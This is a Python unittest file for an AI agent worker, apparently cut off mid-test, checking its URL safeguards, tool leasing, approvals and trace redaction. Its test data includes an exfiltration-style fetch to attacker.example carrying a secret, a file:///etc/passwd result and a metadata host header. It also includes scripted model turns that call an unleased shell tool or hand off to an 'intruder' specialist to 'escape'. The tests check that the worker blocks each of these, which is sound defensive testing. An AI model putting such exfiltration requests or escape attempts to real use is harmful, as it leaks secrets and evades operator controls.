from __future__ import annotations

import json
import os
import socket
import unittest
from contextlib import contextmanager
from types import SimpleNamespace
from typing import Any
from unittest.mock import patch

from agat_worker import (
    LocalModelClient,
    _ollama_api_root,
    discover_model_profiles,
    execute_knowledge_lease,
    parse_model_profile_overrides,
    supported_agent_runtime_profiles,
    supported_agent_runtimes,
)
from telemetry import ExecutionMetrics, use_execution_metrics
from web_tools import (
    WebToolConfig,
    WebToolError,
    WebToolResult,
    WebToolbox,
    _ReadableHtml,
    _rank_search_results,
    _unwrap_model_url,
    authorization_key,
    execute_http_activity,
    explicit_url_keys,
    validate_public_url,
)


class _FakeResponse:
    def __init__(self, payload: bytes) -> None:
        self.payload = payload
        self.offset = 0

    def __enter__(self) -> _FakeResponse:
        return self

    def __exit__(self, *_args: Any) -> None:
        return None

    def read(self, size: int = -1) -> bytes:
        if size < 0:
            size = len(self.payload) - self.offset
        chunk = self.payload[self.offset : self.offset + size]
        self.offset += len(chunk)
        return chunk


class _FakeToolbox:
    @staticmethod
    def definitions() -> list[dict[str, Any]]:
        return WebToolbox.definitions()

    def execute(
        self,
        name: str,
        arguments: dict[str, Any],
        _allowed_fetch_urls: set[str] | None = None,
    ) -> WebToolResult:
        return WebToolResult(
            content=json.dumps({"ok": True, "name": name, "arguments": arguments}),
            audit={"tool": name, "success": True, "resultCount": 1},
            success=True,
            allowed_urls=("https://example.com/",) if name == "web_search" else (),
            fetch_targets=("https://example.com",) if name == "web_search" else (),
        )


class _ScriptedModelClient(LocalModelClient):
    def __init__(self, responses: list[dict[str, Any]]) -> None:
        super().__init__("http://model.invalid/v1", "", _FakeToolbox(), max_tool_rounds=4)
        self.responses = iter(responses)
        self.requests: list[tuple[list[dict[str, Any]], bool]] = []

    def _chat(
        self,
        _model: str,
        messages: list[dict[str, Any]],
        *,
        with_tools: bool,
    ) -> dict[str, Any]:
        self.requests.append(([dict(message) for message in messages], with_tools))
        return next(self.responses)


_GRAPH_START = "__start__"
_GRAPH_END = "__end__"


class _InMemoryStateGraph:
    """Small execution harness for runtime-contract tests without optional LangGraph."""

    def __init__(self, _state_type: Any) -> None:
        self.nodes: dict[str, Any] = {}
        self.edges: dict[str, str] = {}
        self.conditionals: dict[str, tuple[Any, dict[str, str]]] = {}

    def add_node(self, name: str, handler: Any) -> None:
        self.nodes[name] = handler

    def add_edge(self, source: str, target: str) -> None:
        self.edges[source] = target

    def add_conditional_edges(
        self,
        source: str,
        selector: Any,
        routes: dict[str, str],
    ) -> None:
        self.conditionals[source] = (selector, routes)

    def compile(self) -> _InMemoryStateGraph:
        return self

    def invoke(self, initial: dict[str, Any], config: dict[str, Any]) -> dict[str, Any]:
        state = dict(initial)
        node = self.edges[_GRAPH_START]
        recursion_limit = int(config.get("recursion_limit", 100))
        for _step in range(recursion_limit):
            if node == _GRAPH_END:
                return state
            update = self.nodes[node](dict(state))
            if not isinstance(update, dict):
                raise RuntimeError("Graph node returned an invalid update")
            state.update(update)
            if node in self.conditionals:
                selector, routes = self.conditionals[node]
                route = selector(state)
                node = routes[route]
            else:
                node = self.edges[node]
        raise RuntimeError("Graph recursion limit exceeded")


@contextmanager
def _fake_langgraph() -> Any:
    real_import = __import__

    def fake_import(name: str, *args: Any, **kwargs: Any) -> Any:
        if name == "langgraph.graph":
            return SimpleNamespace(
                END=_GRAPH_END,
                START=_GRAPH_START,
                StateGraph=_InMemoryStateGraph,
            )
        return real_import(name, *args, **kwargs)

    with patch("builtins.__import__", side_effect=fake_import):
        yield


class _FakeMcpCoordinator:
    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []
        self.status_calls = 0
        self.cancel_calls = 0

    def mcp_call(
        self,
        lease_id: str,
        public_name: str,
        client_call_id: str,
        arguments: dict[str, Any],
    ) -> dict[str, Any]:
        self.calls.append(
            {
                "leaseId": lease_id,
                "publicName": public_name,
                "clientCallId": client_call_id,
                "arguments": arguments,
            }
        )
        return {"callId": "gateway-call-1", "status": "waiting_approval"}

    def mcp_call_status(self, lease_id: str, call_id: str) -> dict[str, Any]:
        self.status_calls += 1
        return {
            "callId": call_id,
            "status": "completed",
            "result": {"resultType": "complete", "content": [{"type": "text", "text": "customer"}]},
        }

    def mcp_cancel(self, lease_id: str, call_id: str) -> dict[str, Any]:
        self.cancel_calls += 1
        return {
            "callId": call_id,
            "status": "expired",
            "error": "Worker перестал ожидать approval",
        }


class _ScriptedMcpModelClient(LocalModelClient):
    def __init__(
        self,
        responses: list[dict[str, Any]],
        coordinator: _FakeMcpCoordinator,
    ) -> None:
        super().__init__(
            "http://model.invalid/v1",
            "",
            max_tool_rounds=4,
            coordinator_client=coordinator,  # type: ignore[arg-type]
        )
        self.responses = iter(responses)
        self.requests: list[tuple[list[dict[str, Any]], bool]] = []

    def _chat(
        self,
        _model: str,
        messages: list[dict[str, Any]],
        *,
        with_tools: bool,
    ) -> dict[str, Any]:
        self.requests.append(([dict(message) for message in messages], with_tools))
        return next(self.responses)


class _OrderingTelemetry:
    def __init__(self) -> None:
        self.model_span_active = False
        self.injected_inside_model_span = False

    @contextmanager
    def model_span(self, _model: str, _endpoint: str):
        self.model_span_active = True
        try:
            yield SimpleNamespace(set_attribute=lambda *_args: None)
        finally:
            self.model_span_active = False

    def inject(self, headers: dict[str, str]) -> None:
        self.injected_inside_model_span = self.model_span_active
        headers["traceparent"] = "00-11111111111111111111111111111111-2222222222222222-01"


class _FakeKnowledgeCoordinator:
    def __init__(self) -> None:
        self.searches: list[dict[str, Any]] = []
        self.completed: list[dict[str, Any]] = []
        self.failed: list[dict[str, str]] = []

    def knowledge_search(
        self, lease_id: str, queries: list[dict[str, Any]]
    ) -> dict[str, Any]:
        self.searches.append({"leaseId": lease_id, "queries": queries})
        return {
            "hits": [
                {
                    "marker": "K1",
                    "score": 0.98,
                    "content": "Customer data remains on the local deployment.",
                    "provenance": {
                        "documentName": "Product handbook",
                        "sourceUri": "agat://handbook/privacy",
                    },
                }
            ]
        }

    def knowledge_complete(
        self, lease_id: str, embeddings: list[dict[str, Any]]
    ) -> dict[str, Any]:
        self.completed.append({"leaseId": lease_id, "embeddings": embeddings})
        return {"completed": True, "remainingChunks": 0}

    def knowledge_fail(self, lease_id: str, error: str) -> dict[str, Any]:
        self.failed.append({"leaseId": lease_id, "error": error})
        return {"retrying": False}

    def knowledge_renew(self, _lease_id: str) -> None:
        return None


class _RagModelClient(LocalModelClient):
    def __init__(self, coordinator: _FakeKnowledgeCoordinator) -> None:
        super().__init__(
            "http://model.invalid/v1",
            "",
            coordinator_client=coordinator,  # type: ignore[arg-type]
        )
        self.requests: list[list[dict[str, Any]]] = []

    def embed(self, _model: str, inputs: list[str]) -> list[list[float]]:
        return [[1.0, 0.0] for _input in inputs]

    def _chat(
        self,
        _model: str,
        messages: list[dict[str, Any]],
        *,
        with_tools: bool,
    ) -> dict[str, Any]:
        self.assert_no_tools(with_tools)
        self.requests.append([dict(message) for message in messages])
        return {"content": "Data is local [K1]."}

    @staticmethod
    def assert_no_tools(with_tools: bool) -> None:
        if with_tools:
            raise AssertionError("RAG test must not enable tools")


class PublicUrlValidationTests(unittest.TestCase):
    def test_rejects_loopback_without_dns(self) -> None:
        with patch("web_tools.socket.getaddrinfo") as resolve:
            resolve.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", 80))
            ]
            with self.assertRaisesRegex(WebToolError, "непубличным"):
                validate_public_url("http://127.0.0.1/private")

    def test_rejects_private_address_hidden_in_mixed_dns_answer(self) -> None:
        with patch("web_tools.socket.getaddrinfo") as resolve:
            resolve.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443)),
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.0.0.5", 443)),
            ]
            with self.assertRaisesRegex(WebToolError, "непубличным"):
                validate_public_url("https://example.com")

    def test_accepts_public_https_address(self) -> None:
        with patch("web_tools.socket.getaddrinfo") as resolve:
            resolve.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
            ]
            parsed = validate_public_url("https://example.com/page")
        self.assertEqual(parsed.hostname, "example.com")

    def test_rejects_credentials_and_non_web_ports(self) -> None:
        with self.assertRaisesRegex(WebToolError, "учётными данными"):
            validate_public_url("https://user:pass@example.com")
        with self.assertRaisesRegex(WebToolError, "web-порты"):
            validate_public_url("https://example.com:8443")

    def test_unwraps_markdown_url_from_small_model(self) -> None:
        self.assertEqual(
            _unwrap_model_url("[Official docs](https://example.com/docs)"),
            "https://example.com/docs",
        )

    def test_builds_exact_fragment_free_authorization_key(self) -> None:
        self.assertEqual(
            authorization_key("HTTPS://Example.COM:443/docs?q=1#section"),
            "https://example.com/docs?q=1",
        )

    def test_http_activity_reuses_ssrf_guard_and_rejects_transport_headers(self) -> None:
        with patch("web_tools.socket.getaddrinfo") as resolve:
            resolve.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", 80))
            ]
            with self.assertRaisesRegex(WebToolError, "локальным"):
                execute_http_activity({"method": "GET", "url": "http://localhost/private"})

        with patch("web_tools.socket.getaddrinfo") as resolve:
            resolve.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
            ]
            with self.assertRaisesRegex(WebToolError, "запрещённый заголовок"):
                execute_http_activity({
                    "method": "POST",
                    "url": "https://example.com",
                    "headers": {"Host": "metadata.internal"},
                    "body": "{}",
                })
        self.assertEqual(
            explicit_url_keys("Прочитай https://example.com/docs, затем ответь."),
            {"https://example.com/docs"},
        )


class ModelProfileTests(unittest.TestCase):
    def test_discovers_ollama_capabilities_and_merges_explicit_quality(self) -> None:
        explicit = parse_model_profile_overrides(
            '{"qwen3:8b":{"qualityScore":87}}',
            ("qwen3:8b",),
        )
        config = SimpleNamespace(
            models=("qwen3:8b",),
            model_discovery="auto",
            model_base_url="http://127.0.0.1:11434/v1",
            model_api_key="ollama",
            model_profiles=explicit,
        )

        def response(url: str, _key: str, *, body: dict[str, Any] | None = None):
            if url.endswith("/api/tags"):
                return {
                    "models": [{
                        "name": "qwen3:8b",
                        "size": 5_000_000_000,
                        "details": {
                            "parameter_size": "8.2B",
                            "quantization_level": "Q4_K_M",
                        },
                    }]
                }
            self.assertEqual(body, {"model": "qwen3:8b", "verbose": False})
            return {
                "capabilities": ["completion", "tools"],
                "model_info": {
                    "qwen3.context_length": 131_072,
                    "general.parameter_count": 8_200_000_000,
                },
            }

        with patch("agat_worker._native_model_json", side_effect=response):
            profiles = discover_model_profiles(config)  # type: ignore[arg-type]

        self.assertEqual(_ollama_api_root(config.model_base_url), "http://127.0.0.1:11434")
        self.assertEqual(len(profiles), 1)
        profile = profiles[0]
        self.assertEqual(profile["contextWindow"], 131_072)
        self.assertEqual(profile["parameterCount"], 8_200_000_000)
        self.assertEqual(profile["capabilities"], ["completion", "tools"])
        self.assertEqual(profile["qualityScore"], 87)

    def test_execution_metrics_report_model_time_and_estimated_energy(self) -> None:
        with patch.dict(os.environ, {"AGAT_WORKER_POWER_WATTS": "50"}):
            metrics = ExecutionMetrics.start("qwen3:8b", "none")
        metrics.record_model(10, 20, 2_000)

        payload = metrics.payload()
        self.assertEqual(payload["modelDurationMs"], 2_000)
        self.assertEqual(payload["energyJoules"], 100)


class HtmlExtractionTests(unittest.TestCase):
    def test_drops_scripts_styles_and_normalizes_text(self) -> None:
        parser = _ReadableHtml()
        parser.feed(
            "<html><head><title> Example &amp; test </title><style>secret{}</style></head>"
            "<body><h1>Heading</h1><script>ignore me</script><p>Hello   world</p></body></html>"
        )
        parser.close()
        self.assertEqual(parser.title, "Example & test")
        self.assertEqual(parser.text, "Heading\nHello world")


class SearchToolTests(unittest.TestCase):
    def test_prioritizes_likely_first_party_domain(self) -> None:
        ranked = _rank_search_results(
            [
                {
                    "title": "Third party",
                    "url": "https://example.com/ollama-guide",
                    "snippet": "",
                },
                {
                    "title": "Official",
                    "url": "https://docs.ollama.com/capabilities/tool-calling",
                    "snippet": "",
                },
            ],
            "official Ollama tool calling documentation",
        )
        self.assertEqual(ranked[0]["title"], "Official")

    def test_limits_and_sanitizes_search_results(self) -> None:
        response = {
            "results": [
                {
                    "title": "  Official   page ",
                    "url": "https://example.com/docs",
                    "content": "  useful   snippet ",
                },
                {"title": "local", "url": "file:///etc/passwd", "content": "skip"},
            ]
        }
        toolbox = WebToolbox(WebToolConfig(search_url="http://search.internal/search"))
        with patch(
            "web_tools.urllib.request.urlopen",
            return_value=_FakeResponse(json.dumps(response).encode()),
        ):
            result = toolbox.execute("web_search", {"query": "  current   facts  "})

        decoded = json.loads(result.content)
        self.assertTrue(result.success)
        self.assertEqual(decoded["query"], "current facts")
        self.assertEqual(decoded["results"], [
            {
                "title": "Official page",
                "url": "https://example.com/docs",
                "snippet": "useful snippet",
            }
        ])
        self.assertEqual(result.audit["resultCount"], 1)
        self.assertNotIn("query", result.audit)
        self.assertEqual(result.allowed_urls, ("https://example.com/docs",))
        self.assertEqual(result.fetch_targets, ("https://example.com/docs",))

    def test_denies_fetch_url_not_authorized_for_current_task(self) -> None:
        toolbox = WebToolbox(WebToolConfig(search_url="http://search.internal/search"))
        with patch("web_tools.socket.getaddrinfo") as resolve:
            result = toolbox.execute(
                "web_fetch",
                {"url": "https://attacker.example/collect?secret=value"},
                {"https://example.com/allowed"},
            )
        self.assertFalse(result.success)
        self.assertIn("не был получен", result.content)
        resolve.assert_not_called()


class ModelToolLoopTests(unittest.TestCase):
    def test_executes_leased_mcp_tool_through_coordinator_and_waits_for_approval(self) -> None:
        coordinator = _FakeMcpCoordinator()
        client = _ScriptedMcpModelClient(
            [
                {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "model-mcp-call",
                            "type": "function",
                            "function": {
                                "name": "crm__find_customer",
                                "arguments": '{"id":"42","apiToken":"secret-value"}',
                            },
                        }
                    ],
                },
                {"role": "assistant", "content": "Customer found."},
            ],
            coordinator,
        )
        lease = {
            "leaseId": "lease-mcp-1",
            "agent": {"name": "CRM", "systemPrompt": "Find customer.", "model": None},
            "run": {"name": "Lookup", "input": "Customer 42"},
            "context": [],
            "mcpTools": [
                {
                    "publicName": "crm__find_customer",
                    "serverId": "server-1",
                    "serverName": "CRM",
                    "name": "find_customer",
                    "description": "Find customer",
                    "inputSchema": {
                        "type": "object",
                        "properties": {"id": {"type": "string"}},
                    },
                    "risk": "unknown",
                    "policy": "approval",
                }
            ],
        }
        events: list[tuple[str, dict[str, Any]]] = []

        with patch("agat_worker.time.sleep"):
            output = client.complete(
                lease,
                "qwen3:8b",
                lambda phase, audit: events.append((phase, audit)),
            )

        self.assertEqual(output, "Customer found.")
        self.assertEqual(coordinator.status_calls, 1)
        self.assertEqual(coordinator.calls[0]["clientCallId"], "model-mcp-call")
        self.assertEqual(coordinator.calls[0]["arguments"]["apiToken"], "secret-value")
        self.assertEqual([request[1] for request in client.requests], [True, True])
        definitions = client._tool_context.definitions
        self.assertEqual(definitions[0]["function"]["name"], "crm__find_customer")
        self.assertIn("policy=approval", definitions[0]["function"]["description"])
        self.assertNotIn("secret-value", json.dumps(events))
        self.assertEqual(events[-1][1]["status"], "completed")

    def test_never_proxies_a_tool_that_was_not_in_the_lease(self) -> None:
        coordinator = _FakeMcpCoordinator()
        client = _ScriptedMcpModelClient(
            [
                {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "unknown-call",
                            "type": "function",
                            "function": {"name": "admin__shell", "arguments": "{}"},
                        }
                    ],
                },
                {"role": "assistant", "content": "Tool unavailable."},
            ],
            coordinator,
        )
        lease = {
            "leaseId": "lease-mcp-2",
            "agent": {"name": "Safe", "systemPrompt": "Stay safe.", "model": None},
            "run": {"name": "Safety", "input": "Do not run shell"},
            "context": [],
            "mcpTools": [
                {
                    "publicName": "crm__find_customer",
                    "serverName": "CRM",
                    "description": "Find customer",
                    "inputSchema": {"type": "object", "properties": {}},
                    "risk": "read",
                    "policy": "allow",
                }
            ],
        }

        output = client.complete(lease, "qwen3:8b")

        self.assertEqual(output, "Tool unavailable.")
        self.assertEqual(coordinator.calls, [])
        self.assertIn("not available", client.requests[1][0][-1]["content"])

    def test_cancels_a_pending_mcp_approval_when_worker_timeout_expires(self) -> None:
        coordinator = _FakeMcpCoordinator()
        client = LocalModelClient(
            "http://model.invalid/v1",
            "",
            coordinator_client=coordinator,  # type: ignore[arg-type]
            mcp_approval_timeout=30,
        )
        client._tool_context.lease_id = "lease-timeout"
        tool = {
            "publicName": "crm__find_customer",
            "serverName": "CRM",
            "risk": "unknown",
            "policy": "approval",
        }

        with patch("agat_worker.time.monotonic", side_effect=[0.0, 31.0]):
            result = client._execute_mcp_tool(
                "crm__find_customer",
                "timeout-call",
                {"id": "42"},
                tool,
            )

        self.assertFalse(result.success)
        self.assertEqual(result.audit["status"], "expired")
        self.assertEqual(coordinator.cancel_calls, 1)
        self.assertNotIn("42", json.dumps(result.audit))

    def test_injects_model_trace_context_from_inside_the_client_span(self) -> None:
        response = {"choices": [{"message": {"role": "assistant", "content": "done"}}]}
        telemetry = _OrderingTelemetry()
        client = LocalModelClient("http://model.invalid/v1", "", telemetry=telemetry)
        with patch(
            "agat_worker.urllib.request.urlopen",
            return_value=_FakeResponse(json.dumps(response).encode()),
        ) as request_model:
            client._chat("qwen3:8b", [{"role": "user", "content": "input"}], with_tools=False)

        self.assertTrue(telemetry.injected_inside_model_span)
        request = request_model.call_args.args[0]
        self.assertEqual(
            request.get_header("Traceparent"),
            "00-11111111111111111111111111111111-2222222222222222-01",
        )

    def test_records_provider_token_usage_without_storing_prompt_content(self) -> None:
        response = {
            "model": "qwen3:8b",
            "choices": [{"message": {"role": "assistant", "content": "done"}}],
            "usage": {"prompt_tokens": 23, "completion_tokens": 7},
        }
        client = LocalModelClient("http://model.invalid/v1", "")
        metrics = ExecutionMetrics.start("qwen3:8b", "none")
        with patch(
            "agat_worker.urllib.request.urlopen",
            return_value=_FakeResponse(json.dumps(response).encode()),
        ):
            with use_execution_metrics(metrics):
                message = client._chat(
                    "qwen3:8b",
                    [{"role": "user", "content": "sensitive input"}],
                    with_tools=False,
                )
        self.assertEqual(message["content"], "done")
        payload = metrics.payload()
        self.assertEqual(payload["modelCalls"], 1)
        self.assertEqual(payload["inputTokens"], 23)
        self.assertEqual(payload["outputTokens"], 7)
        self.assertNotIn("sensitive input", json.dumps(payload))

    def test_advertises_langgraph_only_when_dependency_is_available(self) -> None:
        real_import = __import__

        def missing_import(name: str, *args: Any, **kwargs: Any) -> Any:
            if name == "langgraph.graph":
                raise ImportError("blocked by test")
            return real_import(name, *args, **kwargs)

        with patch("builtins.__import__", side_effect=missing_import):
            self.assertEqual(supported_agent_runtimes(), ["single"])
            self.assertEqual(supported_agent_runtime_profiles(), [])
        with patch(
            "builtins.__import__",
            return_value=SimpleNamespace(StateGraph=object),
        ):
            self.assertEqual(supported_agent_runtimes(), ["single", "langgraph"])
            self.assertEqual(
                supported_agent_runtime_profiles(),
                ["tool_loop_v1", "specialist_team_v1"],
            )

    def test_langgraph_runtime_fails_clearly_when_dependency_is_missing(self) -> None:
        client = LocalModelClient("http://model.invalid/v1", "")
        lease = {
            "agent": {
                "name": "Graph agent",
                "systemPrompt": "Answer.",
                "model": None,
                "runtime": "langgraph",
            },
            "run": {"name": "Graph", "input": "Input"},
            "context": [],
        }
        real_import = __import__

        def guarded_import(name: str, *args: Any, **kwargs: Any) -> Any:
            if name == "langgraph.graph":
                raise ImportError("blocked by test")
            return real_import(name, *args, **kwargs)

        with patch("builtins.__import__", side_effect=guarded_import):
            with self.assertRaisesRegex(RuntimeError, "requires LangGraph"):
                client.complete(lease, "qwen3:8b")

    @unittest.skipUnless(
        "langgraph" in supported_agent_runtimes(),
        "LangGraph dependency is not installed",
    )
    def test_langgraph_runtime_executes_bounded_model_tool_graph(self) -> None:
        client = _ScriptedModelClient(
            [
                {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "search-graph",
                            "type": "function",
                            "function": {
                                "name": "web_search",
                                "arguments": '{"query":"AGAT"}',
                            },
                        }
                    ],
                },
                {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "fetch-graph",
                            "type": "function",
                            "function": {
                                "name": "web_fetch",
                                "arguments": '{"url":"https://example.com"}',
                            },
                        }
                    ],
                },
                {
                    "role": "assistant",
                    "content": "Graph answer with [source](https://example.com).",
                },
            ]
        )
        events: list[tuple[str, dict[str, Any]]] = []
        lease = {
            "agent": {
                "name": "Graph researcher",
                "systemPrompt": "Verify sources.",
                "model": None,
                "runtime": "langgraph",
                "runtimeConfig": {
                    "profile": "tool_loop_v1",
                    "maxIterations": 2,
                },
            },
            "run": {"name": "Research", "input": "Find AGAT"},
            "context": [],
        }

        output = client.complete(
            lease,
            "qwen3:8b",
            lambda phase, audit: events.append((phase, audit)),
        )

        self.assertIn("Graph answer", output)
        self.assertEqual([with_tools for _messages, with_tools in client.requests], [True, True, False])
        self.assertEqual(
            [phase for phase, _audit in events],
            ["started", "completed", "started", "completed"],
        )

    def test_specialist_team_runs_versioned_handoff_and_validated_state(self) -> None:
        client = _ScriptedModelClient(
            [
                {
                    "role": "assistant",
                    "content": json.dumps(
                        {
                            "action": "delegate",
                            "specialistId": "researcher",
                            "task": "Verify the release facts.",
                        }
                    ),
                },
                {
                    "role": "assistant",
                    "content": "Verified specialist result.",
                },
                {
                    "role": "assistant",
                    "content": json.dumps(
                        {
                            "action": "finish",
                            "answer": "Supervisor synthesis from verified facts.",
                        }
                    ),
                },
            ]
        )
        events: list[tuple[str, dict[str, Any]]] = []
        lease = {
            "agent": {
                "name": "Research team",
                "systemPrompt": "Coordinate specialists and return a concise answer.",
                "model": "supervisor-model",
                "runtime": "langgraph",
                "runtimeConfig": {
                    "profile": "specialist_team_v1",
                    "maxIterations": 4,
                    "maxHandoffs": 3,
                    "stateSchema": "specialist_team_state_v1",
                    "specialistAgentIds": ["researcher", "reviewer"],
                },
                "specialists": [
                    {
                        "schemaVersion": 1,
                        "id": "researcher",
                        "name": "Researcher",
                        "role": "Verifies facts",
                        "systemPrompt": "Verify facts and cite available evidence.",
                        "model": "research-model",
                        "runtimeConfig": {
                            "profile": "tool_loop_v1",
                            "maxIterations": 2,
                        },
                        "promptVersion": "a" * 64,
                        "definitionVersion": "b" * 64,
                    },
                    {
                        "schemaVersion": 1,
                        "id": "reviewer",
                        "name": "Reviewer",
                        "role": "Challenges conclusions",
                        "systemPrompt": "Identify unsupported conclusions.",
                        "model": None,
                        "runtimeConfig": {
                            "profile": "tool_loop_v1",
                            "maxIterations": 2,
                        },
                        "promptVersion": "c" * 64,
                        "definitionVersion": "d" * 64,
                    },
                ],
            },
            "run": {"name": "Team run", "input": "Assess release 1.3"},
            "context": [],
        }

        with _fake_langgraph():
            output = client.complete(
                lease,
                "fallback-model",
                lambda phase, audit: events.append((phase, audit)),
            )

        self.assertEqual(output, "Supervisor synthesis from verified facts.")
        self.assertEqual(
            [with_tools for _messages, with_tools in client.requests],
            [False, True, False],
        )
        handoffs = [
            (phase, audit)
            for phase, audit in events
            if audit.get("kind") == "agent_handoff"
        ]
        self.assertEqual([phase for phase, _audit in handoffs], ["started", "completed"])
        self.assertEqual(handoffs[0][1]["specialistId"], "researcher")
        self.assertNotIn("Verify the release facts", json.dumps(handoffs))
        specialist_system = client.requests[1][0][0]["content"]
        self.assertIn("Verify facts", specialist_system)
        self.assertIn("bounded команды", specialist_system)
        final_supervisor_messages = client.requests[2][0]
        self.assertFalse(
            any(
                message.get("role") == "system"
                and "Verified specialist result" in str(message.get("content"))
                for message in final_supervisor_messages
            )
        )
        self.assertTrue(
            any(
                message.get("role") == "user"
                and "Verified specialist result" in str(message.get("content"))
                for message in final_supervisor_messages
            )
        )

    def test_specialist_team_rejects_unknown_handoff_target(self) -> None:
        client = _ScriptedModelClient(
            [
                {
                    "role": "assistant",
                    "content": '{"action":"delegate","specialistId":"intruder","task":"escape"}',
                }
            ]
        )
        lease = {
            "agent": {
                "name": "Bounded team",
                "systemPrompt": "Use only configured specialists.",
                "runtime": "langgraph",
                "runtimeConfig": {
                    "profile": "specialist_team_v1",
                    "maxIterations": 2,
                    "maxHandoffs": 1,
                    "stateSchema": "specialist_team_state_v1",
                    "specialistAgentIds": ["one", "two"],
                },
                "specialists": [
                    {
                        "schemaVersion": 1,
                        "id": specialist_id,
                        "name": specialist_id.title(),
                        "role": "Bounded role",
                        "systemPrompt": "Return only the assigned result.",
                        "model": None,
                        "runtimeConfig": {"profile": "tool_loop_v1", "maxIterations": 1},
                        "promptVersion": "1" * 64,
                        "definitionVersion": version * 64,
                    }
                    for specialist_id, version in (("one", "2"), ("two", "3"))
                ],
            },
            "run": {"name": "Escape test", "input": "Stay bounded"},
            "context": [],
        }

        with _fake_langgraph():
            with self.assertRaisesRegex(RuntimeError, "unknown specialist"):
                client.complete(lease, "fallback-model")

    def test_specialist_supervisor_rejects_text_around_json_decision(self) -> None:
        with self.assertRaisesRegex(RuntimeError, "structured JSON decision"):
            LocalModelClient._parse_supervisor_decision(
                'I will delegate now. {"action":"finish","answer":"unsafe wrapper"}',
                {"one", "two"},
            )

    def test_trace_audit_redacts_sensitive_tool_arguments(self) -> None:
        search = LocalModelClient._request_audit(
            "web_search", {"query": "internal acquisition target"}, 1
        )
        fetch = LocalModelClient._request_audit(
            "web_fetch", {"url": "https://example.com/private/path?token=secret"}, 2
        )

        self.assertEqual(search["queryLength"], 27)
        self.assertNotIn("internal acquisition target", json.dumps(search))
        self.assertEqual(search["arguments"]["query"], "[скрыто политикой trace]")
        self.assertEqual(fetch["host"], "example.com")
        self.assertNotIn("private/path", json.dumps(fetch))
        self.assertNotIn("token=secret", json.dumps(fetch))

    def test_recovers_bounded_textual_tool_call_from_small_model(self) -> None:
        calls = LocalModelClient._tool_calls(
            {
                "role": "assistant",
                "content": (
                    'assistant\n\n{"name":"web_fetch","parameters":'
                    '{"url":"https://example.com"}}'
                ),
            },
            2,
        )
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["function"]["name"], "web_fetch")
        self.assertEqual(
            json.loads(calls[0]["function"]["arguments"])["url"],
            "https://example.com",
        )

    def test_does_not_execute_arbitrary_json_from_model_text(self) -> None:
        calls = LocalModelClient._tool_calls(
            {"role": "assistant", "content": '{"name":"run_shell","parameters":{}}'},
            2,
        )
        self.assertEqual(calls, [])

    def test_disables_parallel_tool_calls_in_model_payload(self) -> None:
        response = {
            "choices": [{"message": {"role": "assistant", "content": "done"}}]
        }
        client = LocalModelClient(
            "http://model.invalid/v1", "", _FakeToolbox(), max_tool_rounds=3
        )
        with patch(
            "agat_worker.urllib.request.urlopen",
            return_value=_FakeResponse(json.dumps(response).encode()),
        ) as request_model:
            client._chat(
                "qwen3:8b",
                [{"role": "user", "content": "search"}],
                with_tools=True,
            )
        request = request_model.call_args.args[0]
        payload = json.loads(request.data.decode())
        self.assertEqual(payload["tool_choice"], "auto")
        self.assertFalse(payload["parallel_tool_calls"])

    def test_automatically_fetches_selected_search_result_for_weak_model(self) -> None:
        client = _ScriptedModelClient(
            [
                {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "search-1",
                            "type": "function",
                            "function": {
                                "name": "web_search",
                                "arguments": '{"query":"AGAT"}',
                            },
                        }
                    ],
                },
                {"role": "assistant", "content": "Черновик."},
                {
                    "role": "assistant",
                    "content": "Использую [источник](https://example.com).",
                },
                {
                    "role": "assistant",
                    "content": "Проверенный [ответ](https://example.com).",
                },
            ]
        )
        events: list[tuple[str, dict[str, Any]]] = []
        lease = {
            "agent": {"name": "R", "systemPrompt": "Проверяй.", "model": None},
            "run": {"name": "Web", "input": "Найди источник"},
            "context": [],
        }

        output = client.complete(
            lease,
            "qwen3:8b",
            lambda phase, audit: events.append((phase, audit)),
        )

        self.assertIn("Проверенный", output)
        automatic_events = [audit for _phase, audit in events if audit.get("automatic")]
        self.assertEqual(len(automatic_events), 2)
        self.assertTrue(all(event["tool"] == "web_fetch" for event in automatic_events))
        last_request = client.requests[-1][0]
        self.assertEqual(last_request[-1]["role"], "tool")
        self.assertIn("web_fetch", last_request[-1]["content"])

    def test_executes_tool_and_returns_second_model_response(self) -> None:
        client = _ScriptedModelClient(
            [
                {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "call-1",
                            "type": "function",
                            "function": {
                                "name": "web_search",
                                "arguments": '{"query":"AGAT"}',
                            },
                        }
                    ],
                },
                {"role": "assistant", "content": "Черновик по поисковому snippet."},
                {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "call-2",
                            "type": "function",
                            "function": {
                                "name": "web_fetch",
                                "arguments": '{"url":"https://example.com"}',
                            },
                        }
                    ],
                },
                {"role": "assistant", "content": "Ответ со [ссылкой](https://example.com)."},
            ]
        )
        events: list[tuple[str, dict[str, Any]]] = []
        lease = {
            "agent": {
                "name": "Researcher",
                "systemPrompt": "Проверяй факты.",
                "model": None,
            },
            "run": {"name": "Найти сведения", "input": "Что нового?"},
            "context": [],
        }

        output = client.complete(lease, "qwen3:8b", lambda phase, audit: events.append((phase, audit)))

        self.assertIn("https://example.com", output)
        self.assertEqual(
            [event[0] for event in events],
            ["started", "completed", "started", "completed"],
        )
        self.assertTrue(client.requests[0][1])
        second_messages = client.requests[1][0]
        self.assertEqual(second_messages[-1]["role"], "tool")
        self.assertEqual(second_messages[-1]["tool_call_id"], "call-1")
        self.assertIn("web_search", second_messages[-1]["content"])
        third_messages = client.requests[2][0]
        self.assertIn("первоисточник", third_messages[-1]["content"])
        final_messages = client.requests[3][0]
